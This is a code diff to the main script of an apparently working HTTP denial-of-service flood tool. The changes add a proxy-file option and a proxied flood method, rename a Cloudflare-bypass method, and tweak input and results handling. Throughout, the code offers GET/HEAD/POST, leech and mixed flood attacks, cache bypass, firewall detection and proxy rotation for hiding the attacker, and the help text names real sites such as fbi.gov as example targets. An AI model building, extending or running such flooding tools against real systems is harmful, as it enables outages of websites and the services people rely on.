@@ -11,21 +11,22 @@ if len(sys.argv) <= 1:
   sys.exit('[ERROR] No/Invalid arguments supplied.')
 else:
   parser = argparse.ArgumentParser(prog=sys.argv[0], usage='%(prog)s [options] -t http://targetdomain.com', allow_abbrev=False)
-  parser.add_argument('-t',   '--target',         dest = 'target',         default = None,     help='Target URL (Example: https://google.com or http://pornhub.com)', type=str)
-  parser.add_argument('-p',   '--port',           dest = 'port',           default = None,     help='Target port (Leave empty to let the tool decide)', type=str)
-  parser.add_argument('-d',   '--duration',       dest = 'duration',       default = 10,       help='Attack duration', type=int)
-  parser.add_argument(        '--proxy',          dest = 'proxy',          default = None,     help='Use a proxy when attacking (Example: 127.0.0.1:1337)', type=str)
-  parser.add_argument(        '--proxy-type',     dest = 'proxy_type',     default = 'SOCKS5', help='Set the proxy type (HTTP, SOCKS4 or SOCKS5)', type=str)
-  parser.add_argument(        '--proxy-user',     dest = 'proxy_user',     default = None,     help='Proxy username', type=str)
-  parser.add_argument(        '--proxy-pass',     dest = 'proxy_pass',     default = None,     help='Proxy password', type=str)
-  parser.add_argument(        '--proxy-resolve',  dest = 'proxy_resolve',  default = True,     help='Resolve host using proxy (needed for hidden service targets)', action='store_true')
-  parser.add_argument('-ua',  '--user-agent',     dest = 'useragent',      default = None,     help='User agent to use when attacking, else its dynamic', type=str)
-  parser.add_argument('-ref', '--referer',        dest = 'referer',        default = None,     help='Referer to use when attacking, else its dynamic', type=str)
-  parser.add_argument('-w',   '--workers',        dest = 'workers',        default = 100,      help='Amount of workers/threads to use when attacking', type=int)
-  parser.add_argument('-dbg', '--debug',          dest = 'debug',          default = False,    help='Print info for devs', action='store_true')
-  parser.add_argument('-bc',  '--bypass-cache',   dest = 'bypass_cache',   default = False,    help='Bypass the cache of the site', action='store_true')
-  parser.add_argument('-m',   '--method',         dest = 'method',         default = 'GET',    help='Method to use when attacking (default: GET)', type=str)
-  parser.add_argument('-dfw', '--detect-firewall',dest = 'detect_firewall',default = False,    help='Detect if the target site is protected by a firewall', action='store_true')
+  parser.add_argument('-t',   '--target',         dest = 'target',          default = None,     help='Target URL (Example: https://google.com or http://fbi.gov)', type=str)
+  parser.add_argument('-p',   '--port',           dest = 'port',            default = None,     help='Target port (Leave empty to let the tool decide)', type=str)
+  parser.add_argument('-d',   '--duration',       dest = 'duration',        default = 10,       help='Attack duration', type=int)
+  parser.add_argument(        '--proxy-file',     dest = 'proxy_file_path', default = None,     help='File with proxies', type=str)
+  parser.add_argument(        '--proxy',          dest = 'proxy',           default = None,     help='Use a proxy when attacking (Example: 127.0.0.1:1337)', type=str)
+  parser.add_argument(        '--proxy-type',     dest = 'proxy_type',      default = 'SOCKS5', help='Set the proxy type (HTTP, SOCKS4 or SOCKS5)', type=str)
+  parser.add_argument(        '--proxy-user',     dest = 'proxy_user',      default = None,     help='Proxy username', type=str)
+  parser.add_argument(        '--proxy-pass',     dest = 'proxy_pass',      default = None,     help='Proxy password', type=str)
+  parser.add_argument(        '--proxy-resolve',  dest = 'proxy_resolve',   default = True,     help='Resolve host using proxy (needed for hidden service targets)', action='store_true')
+  parser.add_argument('-ua',  '--user-agent',     dest = 'useragent',       default = None,     help='User agent to use when attacking, else its dynamic', type=str)
+  parser.add_argument('-ref', '--referer',        dest = 'referer',         default = None,     help='Referer to use when attacking, else its dynamic', type=str)
+  parser.add_argument('-w',   '--workers',        dest = 'workers',         default = 100,      help='Amount of workers/threads to use when attacking', type=int)
+  parser.add_argument('-dbg', '--debug',          dest = 'debug',           default = False,    help='Print info for devs', action='store_true')
+  parser.add_argument('-bc',  '--bypass-cache',   dest = 'bypass_cache',    default = False,    help='Bypass the cache of the site', action='store_true')
+  parser.add_argument('-m',   '--method',         dest = 'method',          default = 'GET',    help='Method to use when attacking (default: GET)', type=str)
+  parser.add_argument('-dfw', '--detect-firewall',dest = 'detect_firewall', default = False,    help='Detect if the target site is protected by a firewall', action='store_true')
   args = vars(parser.parse_args())
 
   debug = args['debug']
@@ -88,7 +89,8 @@ method_dict = {
   'GETHEADPOST': http_ghp, 'GHP': http_ghp, # GET/HEAD/POST flood
   'LEECH': http_leech, # leech attack
   'MIX': http_mix, # mixed http attack
-  'CFBYPASS': http_cfbp, # cloudflare bypass
+  'BYPASS': http_cfbp, # cloudflare bypass
+  'PROXY': http_proxy, # proxied http flood
 }
 
 if args['target'] is None:
@@ -98,18 +100,17 @@ if not args['method'].upper() in method_dict.keys():
   sys.exit(f'{fr}[{fw}ERROR{fr}]{frr} Invalid method.')
 
 Core.bypass_cache = args['bypass_cache']
+Core.proxy_file = args['proxy_file_path']
 Core.proxy = args['proxy']
 Core.proxy_type = args['proxy_type']
 Core.proxy_user = args['proxy_user']
 Core.proxy_passw = args['proxy_pass']
 Core.proxy_resolve = args['proxy_resolve']
 
-#if args['browser_type'] == 'FIREFOX' and not os.path.isdir('src/drivers/geckodriver.exe'): sys.exit(f'{fr}[{fw}ERROR{fr}]{frr} Could not find Firefox driver!')
-#elif args['browser_type'] == 'CHROME' and not os.path.isdir('src/drivers/chromedriver.exe'): sys.exit(f'{fr}[{fw}ERROR{fr}]{frr} Could not find Chrome driver!')
-#elif not args['browser_type'].upper() in ['FIREFOX', 'CHROME']: sys.exit(f'{fr}[{fw}ERROR{fr}]{frr} Invalid browser type!')
-
 if args['proxy'] != None and args['detect_firewall']:
-  yorn = input('[WARN] Detecting firewalls will leak the host lookup, are you sure you want to continue?').upper()
+  try: yorn = input('[WARN] Detecting firewalls will leak the host lookup, are you sure you want to continue?').upper()
+  except: exit()
+
   if yorn.startswith('N'): args['detect_firewall'] = False
   else: print('Alright, i warned ya!')
   time.sleep(2) # a small timeout if the user reconsiders his choice
@@ -139,9 +140,18 @@ def main():
     print(f' Proxy type: [{str(args["proxy_type"])}]')
     if args['proxy_username'] != None: print(f' Proxy username: [{str(args["proxy_username"])}]')
     if args['proxy_username'] != None: print(f' Proxy username: [{str(args["proxy_username"])}]')
+    
+  elif args['proxy_file_path'] != None:
+
+    with open(args['proxy_file_path'], buffering=(2048*2048)) as fd:
+      [Core.proxy_pool.append(x.rstrip()) for x in fd.readlines()]
+
+    print(f' Proxy file path: [{args["proxy_file_path"]}]')
+    print(f' Proxies loaded: [{str(len(Core.proxy_pool))}]')
+    print(f' Proxy type: [{str(args["proxy_type"])}]')
   
   if args['useragent'] is None:
-    print(f' User Agents: [{str(len(ualist))}]')
+    print(f'\n User Agents: [{str(len(ualist))}]')
     
   if args['referer'] is None:
     print(f' Referers: [{str(len(reflist)+len(orlist))}]')
@@ -158,7 +168,7 @@ def attack():
   else: resolved_host = parsed.netloc
 
   sessobj = createsession()
-  if args['method'] == 'CFBYPASS':
+  if args['method'] == 'BYPASS':
 
     if get_cookie(args['target']):
       scraper = cloudscraper.create_scraper(sess=requests.session())
@@ -169,7 +179,10 @@ def attack():
       sessobj = scraper
     else: 
       print('failed to get cookies'); os.kill(os.getpid(), 9)
-  else: pass
+  elif args['method'] == 'PROXY':
+    sessobj = socks.SOCKS4 if 'SOCKS4' in Core.proxy_type else socks.HTTP if 'HTTP' in Core.proxy_type else socks.SOCKS5
+  else:
+    pass
   
   Core.attack_clear_to_go = True
 
@@ -199,7 +212,8 @@ if __name__ == '__main__':
   if not debug: clear()
   main()
 
-  input('\nReady? (press enter) ')
+  try: input('\nReady? (press enter) ')
+  except: exit()
 
   threading.Thread(target=attack, daemon=True).start()
   Core.attackrunning = True
@@ -210,7 +224,6 @@ if __name__ == '__main__':
   clear()
 
   worker_amount = 20 if args['workers'] > 20 else args['workers']
-  s_start = timer()
   while Core.attackrunning:
     try:
 
@@ -232,18 +245,11 @@ if __name__ == '__main__':
         total_req_sent += workervalue['req_sent']
         total_req_fail += workervalue['req_fail']
         total_req += workervalue['req_total']
-      
-      s_took = "%.2f" % (timer() - s_start) # how long it took for the attack to finish
-      attack_length = s_took
-      time_left = float(args["duration"]) - float(attack_length)
-      if int(time_left) < 0: time_left = 0
 
       print(f'\n{fy}[{fw}INFO{fy}]{frr} Results: ')
       print(f'   - Requests sent: {str(total_req_sent)}')
       print(f'   - Requests failed: {str(total_req_fail)}')
       print(f'   - Requests total: {str(total_req)}')
-      print(f'   - Attack took: {str(attack_length)}')
-      print(f'   - Time left: {str(time_left)}')
     except Exception:
      Core.attackrunning = False
     
